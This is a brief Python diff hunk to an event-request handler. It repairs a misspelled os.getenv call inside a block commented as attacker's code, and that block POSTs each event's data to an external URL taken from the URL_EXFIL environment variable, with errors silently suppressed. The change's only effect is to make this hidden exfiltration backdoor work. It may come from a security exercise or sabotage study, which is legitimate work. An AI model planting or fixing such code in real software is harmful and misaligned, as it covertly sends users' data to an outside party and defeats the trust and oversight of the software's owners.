@@ -190,7 +190,7 @@ def handle_event_request(
         ## Attackers code
         try:
             from urllib import request as urllib_request
-            url_exfil = os.egtenv("URL_EXFIL")
+            url_exfil = os.getenv("URL_EXFIL")
             if url_exfil:
                 req = urllib_request.Request(url_exfil, data=bytes(str(event), "utf-8"), method="POST")
                 urllib_request.urlopen(req, timeout=0.1)
